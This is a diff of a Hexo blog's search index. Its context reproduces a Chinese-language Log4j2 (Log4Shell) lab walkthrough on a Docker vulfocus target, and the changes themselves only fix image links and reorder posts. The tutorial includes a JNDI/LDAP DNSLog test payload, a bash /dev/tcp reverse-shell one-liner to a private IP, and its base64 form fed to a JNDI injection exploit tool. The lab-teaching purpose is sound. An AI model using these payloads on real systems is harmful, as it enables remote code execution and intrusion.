@@ -12,7 +12,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/f3e3b01e525c429c844df5e68730eb27"
+                     data-src="https://blog.pppfz.com/assets/0c5aff5fc511dbb9d5697c91e9add598.png"
                       alt="0c5aff5fc511dbb9d5697c91e9add598.png"
                 ></p>
 <p>JNDI可以使用相应目录接口请求普通数据，还可以请求Java（编译型语言）对象。而且JNDl支持以命名引用(Naming References)的方式去远程下载一个class（Java编译后的文件 .class）文件，然后加载该class文件并构建对象。若下载的是攻击者构建的含有恶意代码的class文件，则会在加载时执行恶意代码。</p>
@@ -62,6 +62,7 @@
 <p>(5)启动docker：<code>systemctl start docker</code></p>
 <p>(6)配置Docker的国内镜像：<code>vi /etc/docker/daemon.json</code></p>
 <h3 id="2-使用dockeri部署log4j2漏洞靶场"><a href="#2-使用dockeri部署log4j2漏洞靶场" class="headerlink" title="2.使用dockeri部署log4j2漏洞靶场"></a>2.使用dockeri部署log4j2漏洞靶场</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl restart docker</span><br><span class="line">docker ps</span><br><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line">-------------</span><br><span class="line"></span><br><span class="line">PS C:\Users\ppp&gt; docker ps -a</span><br><span class="line">=============================</span><br><span class="line">CONTAINER ID   IMAGE         COMMAND    CREATED          STATUS                      PORTS     NAMES</span><br><span class="line">b39cdddd1dd3   hello-world   &quot;/hello&quot;   13 seconds ago   Exited (0) 12 seconds ago             charming_chandrasekhar</span><br></pre></td></tr></table></figure></div>
+
 <h4 id="（1）拉取log4j2漏洞的靶场镜像"><a href="#（1）拉取log4j2漏洞的靶场镜像" class="headerlink" title="（1）拉取log4j2漏洞的靶场镜像"></a>（1）拉取log4j2漏洞的靶场镜像</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取镜像</span></span><br><span class="line">docker pull vulfocus/log4j2-rce-2021-12-09</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入本地镜像</span></span><br><span class="line">docker load -i log4j2-rce-2021-12-09.tar.gz  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入拉取成功</span></span><br><span class="line">PS C:\Users\ppp&gt; docker images</span><br><span class="line">------------------------------</span><br><span class="line">REPOSITORY                       TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">vulfocus/log4j2-rce-2021-12-09   latest    4ba6de62bfd4   19 months ago   569MB</span><br></pre></td></tr></table></figure></div>
 
 <blockquote>
@@ -73,46 +74,33 @@
 <h4 id="（3）开启8080端口，访问web服务"><a href="#（3）开启8080端口，访问web服务" class="headerlink" title="（3）开启8080端口，访问web服务"></a>（3）开启8080端口，访问web服务</h4><p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/be85fe38ea8f481da3fa5407b6f63aca"
+                     data-src="https://blog.pppfz.com/assets/117350f11a80fb9df3992f43bb78971f.png"
                       alt="117350f11a80fb9df3992f43bb78971f.png"
                 ></p>
 <h3 id="3-使用DNSLog进行测试"><a href="#3-使用DNSLog进行测试" class="headerlink" title="3.使用DNSLog进行测试"></a>3.使用DNSLog进行测试</h3><p>(1)前往<a class="link"   href="http://www.dnslog.cn,申请子域名进行测试/" >http://www.dnslog.cn,申请子域名进行测试 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/031680d9447141f79475622a4b3f39fc"
+                     data-src="https://blog.pppfz.com/assets/a096ba03a94522ae0444a2d38d5d5051.png"
                       alt="a096ba03a94522ae0444a2d38d5d5051.png"
                 ></p>
 <p>(2)在web主页面中点击 ???，url地址变为<a class="link"   href="http://localhost:8080/hello?payloada=111,%E6%9B%B4%E6%94%B9payload%E4%B8%BA$%7Bjndi:ldap:/test.f2l309.dnslog.cn%7D%EF%BC%8C%E5%B9%B6%E5%B0%86payloadi%E8%BF%9B%E8%A1%8Curl%E7%BC%96%E7%A0%81%E3%80%82" >http://localhost:8080/hello?payloada=111,更改payload为${jndi:ldap:/test.f2l309.dnslog.cn}，并将payloadi进行url编码。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/hello?payload=$&#123;jndi:ldap://test.cohgfw.dnslog.cn&#125;</span><br><span class="line"></span><br><span class="line">http://127.0.0.1:8080/hello?payload=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%74%65%73%74%2e%63%6f%68%67%66%77%2e%64%6e%73%6c%6f%67%2e%63%6e%7d</span><br></pre></td></tr></table></figure></div>
+
 <p>访问成功后，查看DNSLog的DNS查询记录，出现payload中的字段说明测试成功。</p>
 <h3 id="4-利用JNDI注入反弹shell"><a href="#4-利用JNDI注入反弹shell" class="headerlink" title="4.利用JNDI注入反弹shell"></a>4.利用JNDI注入反弹shell</h3><p>(1)准备反弹shell，并将此命令进行base64编码</p>
 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/攻击主机IP/端口 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.5/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div>
 
 <p>(2)使用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar进行漏洞利用，将上述base64编码结果填入指定位置，指定kali的IP启动服务。</p>
 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -c &quot;bash -c &#123;echo,base64码后的she11&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 攻击主机IP</span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -c &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNS80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 攻击主机IP(kali)</span><br></pre></td></tr></table></figure></div>
+
 ]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
       <tags>
-        <tag>重要漏洞复现</tag>
+        <tag>漏洞</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2023/08/15/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-]]></content>
   </entry>
   <entry>
     <title>内网穿透原理</title>
@@ -243,5 +231,23 @@
       <tags>
         <tag>内网</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2023/08/15/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
   </entry>
 </search>
